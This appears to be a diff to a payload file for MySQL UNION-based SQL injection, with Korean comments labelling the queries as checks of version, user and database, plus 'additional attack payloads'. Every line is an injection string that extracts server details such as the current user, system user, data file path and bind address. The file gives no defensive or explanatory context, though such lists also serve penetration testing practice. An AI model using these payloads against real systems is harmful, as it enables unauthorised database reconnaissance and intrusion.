@@ -1,6 +1,13 @@
+# mysql version 확인
 a' UNION ALL SELECT null,version(),null,null'
+
+# mysql user 확인
 a' UNION ALL SELECT null,CURRENT_USER(),null,null'
+
+# mysql database 확인
 a' UNION ALL SELECT null,DATABASE(),null,null'
+
+# 추가 공격 페이로드
 a' UNION ALL SELECT null,system_user(),null,null'
 a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
 a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
